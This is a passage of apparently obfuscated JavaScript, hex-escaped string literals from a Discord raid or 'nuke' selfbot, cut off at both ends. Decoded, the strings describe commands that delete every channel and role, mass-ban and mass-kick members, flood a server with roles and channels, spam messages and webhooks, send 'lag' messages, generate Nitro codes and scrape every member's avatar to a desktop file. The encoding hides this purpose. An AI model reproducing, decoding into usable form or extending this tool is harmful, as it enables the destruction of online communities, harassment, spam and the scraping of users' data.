x6F\x69\x63\x65\x0D\x0A","\x64\x65\x6C\x63\x68\x61\x6E\x6E\x65\x6C\x73\x20\xBB\x20\x44\x65\x6C\x65\x74\x65\x73\x20\x65\x76\x65\x72\x79\x2D\x73\x69\x6E\x67\x6C\x65\x20\x63\x68\x61\x6E\x6E\x65\x6C\x20\x69\x6E\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A","\x64\x65\x6C\x72\x6F\x6C\x65\x73\x20\xBB\x20\x44\x65\x6C\x65\x74\x65\x73\x20\x65\x76\x65\x72\x79\x2D\x73\x69\x6E\x67\x6C\x65\x20\x72\x6F\x6C\x65\x20\x69\x6E\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A","\x6C\x61\x67\x20\x3C\x75\x73\x65\x72\x2D\x69\x64\x3E\x20\x3C\x61\x6D\x6F\x75\x6E\x74\x3E\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x74\x68\x65\x20\x75\x73\x65\x72\x20\x74\x68\x65\x20\x73\x70\x65\x63\x69\x66\x69\x65\x64\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x6C\x61\x67\x20\x6D\x65\x73\x73\x61\x67\x65\x73\x0D\x0A","\x6D\x61\x73\x73\x63\x68\x61\x6E\x6E\x65\x6C\x73\x20\xBB\x20\x43\x72\x65\x61\x74\x65\x73\x20\x61\x20\x77\x68\x6F\x6C\x65\x20\x62\x75\x6E\x63\x68\x20\x6F\x66\x20\x72\x61\x6E\x64\x6F\x6D\x20\x63\x68\x61\x6E\x6E\x65\x6C\x73\x0D\x0A","\x6D\x61\x73\x73\x72\x6F\x6C\x65\x73\x20\xBB\x20\x43\x72\x65\x61\x74\x65\x73\x20\x61\x20\x77\x68\x6F\x6C\x65\x20\x62\x75\x6E\x63\x68\x20\x6F\x66\x20\x72\x61\x6E\x64\x6F\x6D\x20\x72\x6F\x6C\x65\x73\x0D\x0A","\x6D\x61\x73\x73\x62\x61\x6E\x20\xBB\x20\x42\x61\x6E\x73\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x69\x6E\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x28\x4E\x6F\x74\x20\x69\x6E\x63\x6C\x75\x64\x69\x6E\x67\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x6F\x77\x6E\x65\x72\x20\x6F\x72\x20\x6D\x65\x6D\x62\x65\x72\x73\x20\x77\x69\x74\x68\x20\x61\x20\x68\x69\x67\x68\x65\x72\x20\x72\x61\x6E\x6B\x2F\x72\x6F\x6C\x65\x29\x0D\x0A","\x6D\x61\x73\x73\x6B\x69\x63\x6B\x20\xBB\x20\x4B\x69\x63\x6B\x73\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x69\x6E\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x28\x4E\x6F\x74\x20\x69\x6E\x63\x6C\x75\x64\x69\x6E\x67\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x6F\x77\x6E\x65\x72\x20\x6F\x72\x20\x6D\x65\x6D\x62\x65\x72\x73\x20\x77\x69\x74\x68\x20\x61\x20\x68\x69\x67\x68\x65\x72\x20\x72\x61\x6E\x6B\x2F\x72\x6F\x6C\x65\x29\x0D\x0A","\x6E\x69\x74\x72\x6F\x67\x65\x6E\x20\x3C\x61\x6D\x6F\x75\x6E\x74\x3E\x20\xBB\x20\x47\x65\x6E\x65\x72\x61\x74\x65\x73\x20\x74\x68\x65\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x6E\x69\x74\x72\x6F\x20\x63\x6F\x64\x65\x73\x0D\x0A","\x6F\x72\x69\x67\x69\x6E\x61\x6C\x20\xBB\x20\x52\x65\x73\x65\x74\x73\x20\x74\x68\x65\x20\x65\x6E\x74\x69\x72\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A","\x72\x61\x69\x64\x20\xBB\x20\x43\x68\x61\x6E\x67\x65\x73\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x20\x6E\x61\x6D\x65\x2C\x20\x69\x63\x6F\x6E\x2C\x20\x63\x72\x65\x61\x74\x65\x73\x20\x31\x30\x30\x20\x72\x6F\x6C\x65\x73\x20\x61\x6E\x64\x20\x6D\x61\x6B\x65\x73\x20\x31\x30\x30\x20\x74\x65\x78\x74\x20\x61\x6E\x64\x20\x76\x6F\x69\x63\x65\x20\x63\x68\x61\x6E\x6E\x65\x6C\x73\x0D\x0A","\x73\x70\x61\x6D\x61\x6C\x6C\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x65\x6E\x64\x73\x20\x65\x76\x65\x72\x79\x20\x63\x68\x61\x6E\x6E\x65\x6C\x20\x61\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A","\x73\x70\x61\x6D\x20\x3C\x61\x6D\x6F\x75\x6E\x74\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x70\x61\x6D\x73\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x74\x68\x65\x20\x73\x70\x65\x63\x69\x66\x69\x65\x64\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x74\x69\x6D\x65\x73\x0D\x0A","\x77\x65\x62\x68\x6F\x6F\x6B\x73\x70\x61\x6D\x20\x3C\x77\x65\x62\x68\x6F\x6F\x6B\x2D\x75\x72\x6C\x3E\x20\x3C\x74\x72\x75\x65\x7C\x66\x61\x6C\x73\x65\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x70\x61\x6D\x73\x20\x74\x68\x65\x20\x77\x65\x62\x68\x6F\x6F\x6B\x20\x31\x30\x30\x20\x74\x69\x6D\x65\x73\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x28\x74\x72\x75\x65\x20\x3D\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x2C\x20\x66\x61\x6C\x73\x65\x20\x3D\x20\x72\x65\x67\x75\x6C\x61\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x20\x77\x69\x74\x68\x6F\x75\x74\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x29\x0D\x0A","\x77\x65\x62\x68\x6F\x6F\x6B\x72\x61\x69\x64\x20\x3C\x61\x6D\x6F\x75\x6E\x74\x3E\x20\x3C\x6D\x65\x73\x73\x61\x67\x65\x3E\x20\xBB\x20\x53\x70\x61\x6D\x73\x20\x40\x65\x76\x65\x72\x79\x6F\x6E\x65\x20\x74\x68\x65\x20\x61\x6D\x6F\x75\x6E\x74\x20\x6F\x66\x20\x74\x69\x6D\x65\x73\x20\x77\x69\x74\x68\x20\x79\x6F\x75\x72\x20\x6D\x65\x73\x73\x61\x67\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x20\x28\x4D\x75\x73\x74\x20\x68\x61\x76\x65\x20\x77\x65\x62\x68\x6F\x6F\x6B\x20\x75\x72\x6C\x20\x69\x6E\x20\x74\x68\x65\x20\x63\x6F\x6E\x66\x69\x67\x20\x66\x69\x6C\x65\x29","\x6D\x6F\x64\x65\x72\x61\x74\x69\x6F\x6E","\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x61\x64\x64\x72\x6F\x6C\x65\x20\x3C\x72\x6F\x6C\x65\x3E\x20\x3C\x6D\x65\x6D\x62\x65\x72\x3E\x2A\x2A\x20\xBB\x20\x47\x69\x76\x65\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x72\x6F\x6C\x65\x20\x74\x6F\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x6D\x65\x6D\x62\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x63\x72\x65\x61\x74\x65\x72\x6F\x6C\x65\x20\x3C\x68\x65\x78\x2D\x63\x6F\x6C\x6F\x72\x3E\x20\x3C\x6E\x61\x6D\x65\x3E\x2A\x2A\x20\xBB\x20\x43\x72\x65\x61\x74\x65\x73\x20\x61\x20\x6E\x65\x77\x20\x72\x6F\x6C\x65\x20\x77\x69\x74\x68\x20\x74\x68\x65\x20\x63\x6F\x6C\x6F\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x64\x65\x6C\x65\x74\x65\x72\x6F\x6C\x65\x20\x3C\x6E\x61\x6D\x65\x3E\x2A\x2A\x20\xBB\x20\x44\x65\x6C\x65\x74\x73\x20\x74\x68\x65\x20\x72\x6F\x6C\x65\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x72\x61\x69\x6E\x62\x6F\x77\x20\x3C\x72\x6F\x6C\x65\x3E\x2A\x2A\x20\xBB\x20\x45\x64\x69\x74\x73\x20\x74\x68\x61\x74\x20\x72\x6F\x6C\x65\x20\x74\x6F\x20\x72\x61\x69\x6E\x62\x6F\x77\x20\x63\x6F\x6C\x6F\x72\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x72\x65\x6D\x6F\x76\x65\x72\x6F\x6C\x65\x20\x3C\x72\x6F\x6C\x65\x3E\x20\x3C\x6D\x65\x6D\x62\x65\x72\x3E\x2A\x2A\x20\xBB\x20\x52\x65\x6D\x6F\x76\x65\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x72\x6F\x6C\x65\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x6D\x65\x6D\x62\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x62\x61\x6E\x20\x3C\x6D\x65\x6D\x62\x65\x72\x3E\x20\x5B\x72\x65\x61\x73\x6F\x6E\x5D\x2A\x2A\x20\xBB\x20\x42\x61\x6E\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x6D\x65\x6D\x62\x65\x72\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6B\x69\x63\x6B\x20\x3C\x6D\x65\x6D\x62\x65\x72\x3E\x20\x5B\x72\x65\x61\x73\x6F\x6E\x5D\x2A\x2A\x20\xBB\x20\x4B\x69\x63\x6B\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x6D\x65\x6D\x62\x65\x72\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20","\x4D\x6F\x64\x65\x72\x61\x74\x69\x6F\x6E\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x4D\x6F\x64\x65\x72\x61\x74\x69\x6F\x6E\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20","\x61\x64\x64\x72\x6F\x6C\x65\x20\x3C\x72\x6F\x6C\x65\x3E\x20\x3C\x6D\x65\x6D\x62\x65\x72\x3E\x20\xBB\x20\x47\x69\x76\x65\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x72\x6F\x6C\x65\x20\x74\x6F\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x6D\x65\x6D\x62\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20","\x63\x72\x65\x61\x74\x65\x72\x6F\x6C\x65\x20\x3C\x68\x65\x78\x2D\x63\x6F\x6C\x6F\x72\x3E\x20\x3C\x6E\x61\x6D\x65\x3E\x20\xBB\x20\x43\x72\x65\x61\x74\x65\x73\x20\x61\x20\x6E\x65\x77\x20\x72\x6F\x6C\x65\x20\x77\x69\x74\x68\x20\x74\x68\x65\x20\x63\x6F\x6C\x6F\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20","\x64\x65\x6C\x65\x74\x65\x72\x6F\x6C\x65\x20\x3C\x6E\x61\x6D\x65\x3E\x20\xBB\x20\x44\x65\x6C\x65\x74\x73\x20\x74\x68\x65\x20\x72\x6F\x6C\x65\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20","\x72\x61\x69\x6E\x62\x6F\x77\x20\x3C\x72\x6F\x6C\x65\x3E\x20\xBB\x20\x45\x64\x69\x74\x73\x20\x74\x68\x61\x74\x20\x72\x6F\x6C\x65\x20\x74\x6F\x20\x72\x61\x69\x6E\x62\x6F\x77\x20\x63\x6F\x6C\x6F\x72\x73\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20","\x72\x65\x6D\x6F\x76\x65\x72\x6F\x6C\x65\x20\x3C\x72\x6F\x6C\x65\x3E\x20\x3C\x6D\x65\x6D\x62\x65\x72\x3E\x20\xBB\x20\x52\x65\x6D\x6F\x76\x65\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x72\x6F\x6C\x65\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x6D\x65\x6D\x62\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20","\x62\x61\x6E\x20\x3C\x6D\x65\x6D\x62\x65\x72\x3E\x20\x5B\x72\x65\x61\x73\x6F\x6E\x5D\x20\xBB\x20\x42\x61\x6E\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x6D\x65\x6D\x62\x65\x72\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20","\x6B\x69\x63\x6B\x20\x3C\x6D\x65\x6D\x62\x65\x72\x3E\x20\x5B\x72\x65\x61\x73\x6F\x6E\x5D\x20\xBB\x20\x4B\x69\x63\x6B\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x6D\x65\x6D\x62\x65\x72\x20\x66\x72\x6F\x6D\x20\x74\x68\x65\x20\x73\x65\x72\x76\x65\x72","\x0D\x0A\x20\x20\x20\x20\x20\x20\x5C\x60\x5C\x60\x5C\x60","\x61\x63\x63\x6F\x75\x6E\x74","\x63\x6F\x70\x79\x20\x3C\x75\x73\x65\x72\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x75\x73\x65\x72\x6E\x61\x6D\x65\x20\x61\x6E\x64\x20\x61\x76\x61\x74\x61\x72\x20\x61\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x75\x73\x65\x72\x73\x20\x61\x76\x61\x74\x61\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x69\x6E\x76\x69\x73\x69\x62\x6C\x65\x2A\x2A\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x75\x73\x65\x72\x6E\x61\x6D\x65\x20\x61\x6E\x64\x20\x61\x76\x61\x74\x61\x72\x20\x61\x73\x20\x73\x6F\x6D\x65\x74\x68\x69\x6E\x67\x20\x69\x6E\x76\x69\x73\x69\x62\x6C\x65\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x6A\x6F\x69\x6E\x20\x3C\x69\x6E\x76\x69\x74\x65\x2D\x63\x6F\x64\x65\x3E\x2A\x2A\x20\xBB\x20\x4A\x6F\x69\x6E\x73\x20\x61\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x73\x65\x72\x76\x65\x72\x20\x66\x6F\x72\x20\x79\x6F\x75\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x72\x65\x61\x64\x2A\x2A\x20\xBB\x20\x4D\x61\x72\x6B\x73\x20\x65\x76\x65\x72\x79\x20\x73\x65\x72\x76\x65\x72\x20\x74\x68\x61\x74\x20\x79\x6F\x75\x20\x61\x72\x65\x20\x69\x6E\x20\x61\x73\x20\x72\x65\x61\x64\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x74\x65\x61\x6C\x61\x6C\x6C\x70\x66\x70\x2A\x2A\x20\xBB\x20\x47\x65\x74\x73\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x73\x20\x61\x76\x61\x74\x61\x72\x20\x61\x6E\x64\x20\x73\x61\x76\x65\x73\x20\x69\x74\x20\x69\x6E\x74\x6F\x20\x61\x20\x6A\x73\x6F\x6E\x20\x66\x69\x6C\x65\x20\x6F\x6E\x20\x79\x6F\x75\x72\x20\x64\x65\x73\x6B\x74\x6F\x70\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20\x2A\x2A","\x73\x74\x65\x61\x6C\x70\x66\x70\x20\x3C\x75\x73\x65\x72\x3E\x2A\x2A\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x61\x76\x61\x74\x61\x72\x20\x61\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x75\x73\x65\x72\x73\x20\x61\x76\x61\x74\x61\x72\x0D\x0A\x20\x20\x20\x20\x20\x20\x20\x20","\x41\x63\x63\x6F\x75\x6E\x74\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73","\x5C\x60\x5C\x60\x5C\x60\x0D\x0A\x20\x20\x20\x20\x20\x20\x41\x63\x63\x6F\x75\x6E\x74\x20\x43\x6F\x6D\x6D\x61\x6E\x64\x73\x0D\x0A\x0D\x0A\x20\x20\x20\x20\x20\x20\x3C\x3E\x20\x3D\x20\x72\x65\x71\x75\x69\x72\x65\x64\x20\x7C\x20\x5B\x5D\x20\x3D\x20\x6F\x70\x74\x69\x6F\x6E\x61\x6C\x0D\x0A\x20\x20\x20\x20\x20\x20\x0D\x0A\x20\x20\x20\x20\x20\x20","\x63\x6F\x70\x79\x20\x3C\x75\x73\x65\x72\x3E\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x75\x73\x65\x72\x6E\x61\x6D\x65\x20\x61\x6E\x64\x20\x61\x76\x61\x74\x61\x72\x20\x61\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x75\x73\x65\x72\x73\x20\x61\x76\x61\x74\x61\x72\x0D\x0A\x20\x20\x20\x20\x20\x20","\x69\x6E\x76\x69\x73\x69\x62\x6C\x65\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x75\x73\x65\x72\x6E\x61\x6D\x65\x20\x61\x6E\x64\x20\x61\x76\x61\x74\x61\x72\x20\x61\x73\x20\x73\x6F\x6D\x65\x74\x68\x69\x6E\x67\x20\x69\x6E\x76\x69\x73\x69\x62\x6C\x65\x0D\x0A\x20\x20\x20\x20\x20\x20","\x6A\x6F\x69\x6E\x20\x3C\x69\x6E\x76\x69\x74\x65\x2D\x63\x6F\x64\x65\x3E\x20\xBB\x20\x4A\x6F\x69\x6E\x73\x20\x61\x20\x64\x69\x73\x63\x6F\x72\x64\x20\x73\x65\x72\x76\x65\x72\x20\x66\x6F\x72\x20\x79\x6F\x75\x0D\x0A\x20\x20\x20\x20\x20\x20","\x72\x65\x61\x64\x20\xBB\x20\x4D\x61\x72\x6B\x73\x20\x65\x76\x65\x72\x79\x20\x73\x65\x72\x76\x65\x72\x20\x74\x68\x61\x74\x20\x79\x6F\x75\x20\x61\x72\x65\x20\x69\x6E\x20\x61\x73\x20\x72\x65\x61\x64\x0D\x0A\x20\x20\x20\x20\x20\x20","\x73\x74\x65\x61\x6C\x61\x6C\x6C\x70\x66\x70\x20\xBB\x20\x47\x65\x74\x73\x20\x65\x76\x65\x72\x79\x6F\x6E\x65\x73\x20\x61\x76\x61\x74\x61\x72\x20\x61\x6E\x64\x20\x73\x61\x76\x65\x73\x20\x69\x74\x20\x69\x6E\x74\x6F\x20\x61\x20\x6A\x73\x6F\x6E\x20\x66\x69\x6C\x65\x20\x6F\x6E\x20\x79\x6F\x75\x72\x20\x64\x65\x73\x6B\x74\x6F\x70\x20\x5B\x47\x55\x49\x4C\x44\x20\x4F\x4E\x4C\x59\x5D\x0D\x0A\x20\x20\x20\x20\x20\x20","\x73\x74\x65\x61\x6C\x70\x66\x70\x20\x3C\x75\x73\x65\x72\x3E\x20\xBB\x20\x53\x65\x74\x73\x20\x79\x6F\x75\x72\x20\x61\x76\x61\x74\x61\x72\x20\x61\x73\x20\x74\x68\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x65\x64\x20\x75\x73\x65\x72\x73\x20\x61\x76\x61\x74\x61\x72","\x72\x65\x61\x64","\x61\x63\x6B\x6E\x6F\x77\x6C\x65\x64\x67\x65","\x67\x75\x69\x6C\x64\x73","\x73\x74\x65\x61\x6C\x61\x6C\x6C\x70\x66\x70","\x5D\x3A\x20","\x2E\x2E\x2F\x2E\x2E\x2F\x2E\x2E\x2F\x44\x65\x73\x6B\x74\x6F\x70\x2F\x61\x76\x61\x74\x61\x72\x73\x2E\x6A\x73\x6F\x6E","\x73\x74\x72\x69\x6E\x67\x69\x66\x79","\x77\x72\x69\x74\x65\x46\x69\x6C\x65\x53\x79\x6E\x63","\x3E\x2C\x20\x47\x6F\x20\x61\x6E\x64\x20\x73\x65\x61\x72\x63\x68\x20\x66\x6F\x72\x20\x61\x20\x66\x69\x6C\x65\x20\x63\x61\x6C\x6C\x65\x64\x20\x5C\x60\x61\x76\x61\x74\x61\x72\x73\x2E\x6A\x73\x6F\x6E\x5C\x60\x20\x6F\x6E\x20\x79\x6F\x75\x72\x20\x64\x65\x73\x6B\x74\x6F\x70","\x69\x6E\x76\x69\x73\x69\x62\x6C\x65","\x49\x6E\x76\x61\x6C\x69\x64\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x77\x61\x73\x20\x70\x72\x6F\x76\x69\x64\x65\x64","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x69\x2E\x67\x79\x61\x7A\x6F\x2E\x63\x6F\x6D\x2F\x34\x39\x32\x62\x65\x62\x32\x39\x61\x32\x63\x30\x31\x33\x33\x33\x31\x31\x66\x36\x65\x61\x66\x36\x33\x64\x66\x63\x36\x33\x37\x32\x2E\x70\x6E\x67","\x73\x65\x74\x41\x76\x61\x74\x61\x72","\x20\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE\u02DE","\x73\x65\x74\x55\x73\x65\x72\x6E\x61\x6D\x65","\x63\x6F\x70\x79","\x50\x6C\x65\x61\x73\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x20\x61\x20\x75\x73\x65\x72","\x73\x74\x65\x61\x6C\x70\x66\x70","\x6D\x61\x73\x73\x72\x65\x61\x63\x74","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x6E\x20\x65\x6D\x6F\x6A\x69","\x72\x65\x61\x63\x74","\x6D\x65\x73\x73\x61\x67\x65\x73","\x73\x70\x6F\x69\x6C\x65\x72","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x6D\x65\x73\x73\x61\x67\x65","\x7C\x7C","\x7C\x7C\x7C\x7C","\x62\x61\x6E","\x6D\x65\x6D\x62\x65\x72","\x4E\x6F\x20\x72\x65\x61\x73\x6F\x6E\x20\x70\x72\x6F\x76\x69\x65\x64","\x42\x41\x4E\x5F\x4D\x45\x4D\x42\x45\x52\x53","\x68\x61\x73\x50\x65\x72\x6D\x69\x73\x73\x69\x6F\x6E","\x6D\x65","\x45\x72\x72\x6F\x72\x21\x20\x49\x20\x64\x6F\x20\x6E\x6F\x74\x20\x68\x61\x76\x65\x20\x65\x6E\x6F\x75\x67\x68\x20\x70\x65\x72\x6D\x69\x73\x73\x69\x6F\x6E\x73\x20\x74\x6F\x20\x64\x6F\x20\x74\x68\x61\x74","\x2A\x2A\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x62\x61\x6E\x6E\x65\x64\x20\x66\x72\x6F\x6D\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72","\x54\x68\x61\x74\x20\x75\x73\x65\x72\x20\x64\x6F\x65\x73\x20\x6E\x6F\x74\x20\x65\x78\x69\x73\x74\x20\x69\x6E\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72","\x50\x6C\x65\x61\x73\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x20\x61\x20\x75\x73\x65\x72\x20\x74\x6F\x20\x62\x61\x6E","\x6B\x69\x63\x6B","\x4B\x49\x43\x4B\x5F\x4D\x45\x4D\x42\x45\x52\x53","\x2A\x2A\x20\x77\x61\x73\x20\x73\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x6B\x69\x63\x6B\x65\x64\x20\x66\x72\x6F\x6D\x20\x74\x68\x69\x73\x20\x73\x65\x72\x76\x65\x72","\x50\x6C\x65\x61\x73\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x20\x61\x20\x75\x73\x65\x72\x20\x74\x6F\x20\x6B\x69\x63\x6B","\x63\x72\x65\x61\x74\x65\x72\x6F\x6C\x65","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x72\x6F\x6C\x65\x20\x63\x6F\x6C\x6F\x72","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x72\x6F\x6C\x65\x20\x6E\x61\x6D\x65","\x63\x72\x65\x61\x74\x65\x52\x6F\x6C\x65","\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x6D\x61\x64\x65\x20\x74\x68\x65\x20\x2A\x2A","\x2A\x2A\x20\x72\x6F\x6C\x65","\x64\x65\x6C\x65\x74\x65\x72\x6F\x6C\x65","\x66\x69\x6E\x64","\x50\x6C\x65\x61\x73\x65\x20\x73\x70\x65\x63\x69\x66\x79\x20\x61\x20\x72\x6F\x6C\x65\x20\x6E\x61\x6D\x65\x20\x74\x6F\x20\x64\x65\x6C\x65\x74\x65","\x54\x68\x61\x74\x20\x72\x6F\x6C\x65\x20\x64\x6F\x65\x73\x20\x6E\x6F\x74\x20\x65\x78\x69\x73\x74","\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x64\x65\x6C\x65\x74\x65\x64\x20\x74\x68\x65\x20\x2A\x2A","\x61\x64\x64\x72\x6F\x6C\x65","\x50\x6C\x65\x61\x73\x65\x20\x6D\x65\x6E\x74\x69\x6F\x6E\x20\x61\x20\x6D\x65\x6D\x62\x65\x72","\x61\x64\x64\x52\x6F\x6C\x65","\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x61\x64\x64\x65\x64\x20\x74\x68\x65\x20\x2A\x2A","\x2A\x2A\x20\x72\x6F\x6C\x65\x20\x74\x6F\x20\x2A\x2A","\x72\x65\x6D\x6F\x76\x65\x72\x6F\x6C\x65","\x72\x65\x6D\x6F\x76\x65\x52\x6F\x6C\x65","\x53\x75\x63\x63\x65\x73\x73\x66\x75\x6C\x6C\x79\x20\x72\x65\x6D\x6F\x76\x65\x64\x20\x74\x68\x65\x20\x2A\x2A","\x2A\x2A\x20\x72\x6F\x6C\x65\x20\x66\x72\x6F\x6D\x20\x2A\x2A","\x6C\x65\x6E\x6E\x79","\x28\x20\u0361\xB0\x20\u035C\u0296\x20\u0361\xB0\x29","\x66\x6C\x69\x70","\x28\u256F\xB0\u25A1\xB0\uF